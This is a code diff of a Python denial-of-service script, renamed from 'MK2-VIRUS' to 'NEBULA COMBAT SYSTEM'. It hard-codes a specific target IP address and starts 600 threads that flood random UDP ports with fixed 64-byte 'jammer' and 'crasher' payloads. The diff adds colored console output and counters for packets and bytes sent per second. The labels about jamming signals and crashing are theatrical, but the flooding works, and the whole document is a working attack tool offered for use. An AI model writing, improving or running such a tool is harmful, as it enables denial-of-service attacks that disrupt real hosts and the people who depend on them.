@@ -6,7 +6,21 @@ import random
 # TARGET
 target = "62.109.121.42"
 
-# HEAVY SIGNAL JAMMING VIRUS PAYLOADS - FIXED SIZES
+# COLORS
+MAGENTA = '\033[95m'
+GREEN = '\033[92m'
+RED = '\033[91m'
+YELLOW = '\033[93m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
+
+# NEBULA SYMBOLS
+STAR = f"{MAGENTA}✧{RESET}"
+DATA_STAR = f"{CYAN}✦{RESET}"
+JAMMER_STAR = f"{YELLOW}✧{RESET}"
+CRASHER_STAR = f"{RED}✧{RESET}"
+
+# HEAVY SIGNAL JAMMING VIRUS PAYLOADS
 VIRUS_JAMMERS = [
     # 1. HIGH-FREQUENCY JAMMER (HFJ) - 64 bytes
     bytes([0x48, 0x46, 0x4A, 0x31] + [random.randint(0x80, 0xFF) for _ in range(60)]),
@@ -34,7 +48,7 @@ VIRUS_JAMMERS = [
     bytes([0x4D, 0x4F, 0x44, 0x4A] + [i % 256 for i in range(60)]),
 ]
 
-# HEAVY CRASHER VIRUS PAYLOADS - FIXED SIZES
+# HEAVY CRASHER VIRUS PAYLOADS
 VIRUS_CRASHERS = [
     # 1. NULL POINTER CRASHER (NULC) - 64 bytes
     bytes([0x4E, 0x55, 0x4C, 0x43] + [0x00] * 60),
@@ -93,57 +107,106 @@ VIRUS_CRASHERS = [
 # COMBINE ALL PAYLOADS
 VIRUS_PAYLOADS = VIRUS_JAMMERS + VIRUS_CRASHERS
 
-print(f"Loaded {len(VIRUS_JAMMERS)} jammers + {len(VIRUS_CRASHERS)} crashers = {len(VIRUS_PAYLOADS)} total viruses")
+# STATS
+stats_lock = threading.Lock()
+total_packets = 0
+total_bytes = 0
+jammers_sent = 0
+crashers_sent = 0
+running = True
 
-# SIMPLE VIRUS ATTACK - NO AUTO-SCALING COMPLEXITY
-packets_sent = 0
-start_time = time.time()
+# THREAD COUNT
+THREAD_COUNT = 600
 
 def virus_attack(thread_id):
-    global packets_sent
+    global total_packets, total_bytes, jammers_sent, crashers_sent
     
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
-    while True:
+    while running:
         try:
             # Select deadly payload
             payload = random.choice(VIRUS_PAYLOADS)
             
-            # Random target port for maximum damage
+            # Check if it's a jammer or crasher
+            is_jammer = payload[:4] in [b"HFJ1", b"LFJ1", b"PATJ", b"CLKJ", b"RNJ1", b"SYNJ", b"CRRJ", b"MODJ"]
+            
+            # Random target port
             port = random.randint(1, 65535)
             
             # LAUNCH VIRUS
             sock.sendto(payload, (target, port))
-            packets_sent += 1
             
+            with stats_lock:
+                total_packets += 1
+                total_bytes += len(payload)
+                if is_jammer:
+                    jammers_sent += 1
+                else:
+                    crashers_sent += 1
+                    
         except:
-            # Recreate socket if broken
             try:
                 sock.close()
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             except:
                 pass
 
-# LAUNCH 600 VIRUS THREADS (FIXED, NO AUTO-SCALE)
-print("☢️  MK2-VIRUS LAUNCHING...")
-print(f"🎯 Target: {target}")
-print(f"💀 Threads: 600")
-print(f"🦠 Viruses: {len(VIRUS_PAYLOADS)} types")
-print("="*50)
+def format_bytes(bytes_count):
+    """Convert bytes to KB/MB/GB"""
+    if bytes_count >= 1024*1024*1024:  # GB
+        return f"{bytes_count/(1024*1024*1024):.2f}GB"
+    elif bytes_count >= 1024*1024:  # MB
+        return f"{bytes_count/(1024*1024):.2f}MB"
+    elif bytes_count >= 1024:  # KB
+        return f"{bytes_count/1024:.2f}KB"
+    else:
+        return f"{bytes_count}B"
 
-for i in range(600):
+# START NEBULA ATTACK
+print(f"\n{STAR} {MAGENTA}NEBULA COMBAT SYSTEM{RESET} {STAR}")
+print(f"{STAR} Target: {YELLOW}{target}{RESET}")
+print(f"{STAR} Threads: {GREEN}{THREAD_COUNT}{RESET}")
+print(f"{STAR} Jammers: {YELLOW}{len(VIRUS_JAMMERS)}{RESET} | Crashers: {RED}{len(VIRUS_CRASHERS)}{RESET}")
+print(f"{STAR} Total Viruses: {CYAN}{len(VIRUS_PAYLOADS)}{RESET}")
+print(f"{STAR} {'─'*50}")
+
+# LAUNCH THREADS
+for i in range(THREAD_COUNT):
     t = threading.Thread(target=virus_attack, args=(i,))
     t.daemon = True
     t.start()
 
-# SIMPLE LOGGING
-last_log = time.time()
-while True:
-    time.sleep(1)
-    elapsed = time.time() - last_log
-    last_log = time.time()
-    
-    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
-    packets_sent = 0
-    
-    print(f"☢️  MK2-VIRUS | {pps}/s")
+# NEBULA LOGGING
+last_time = time.time()
+try:
+    while True:
+        time.sleep(1)
+        current = time.time()
+        elapsed = current - last_time
+        last_time = current
+        
+        with stats_lock:
+            pps = int(total_packets / elapsed) if elapsed > 0 else 0
+            data_rate = total_bytes / elapsed if elapsed > 0 else 0
+            
+            # Calculate percentages
+            total = jammers_sent + crashers_sent
+            jam_percent = (jammers_sent / total * 100) if total > 0 else 0
+            crash_percent = (crashers_sent / total * 100) if total > 0 else 0
+            
+            # Format data rate
+            data_formatted = format_bytes(data_rate)
+            
+            # NEBULA LOG LINE
+            print(f"{STAR} {MAGENTA}NEBULA{RESET}: {GREEN}{pps:,}{RESET}pps {DATA_STAR} {data_formatted}/s {JAMMER_STAR} {jam_percent:.1f}% {CRASHER_STAR} {crash_percent:.1f}%")
+            
+            # Reset counters
+            total_packets = 0
+            total_bytes = 0
+            jammers_sent = 0
+            crashers_sent = 0
+            
+except KeyboardInterrupt:
+    running = False
+    print(f"\n{STAR} {MAGENTA}NEBULA TERMINATED{RESET} {STAR}")
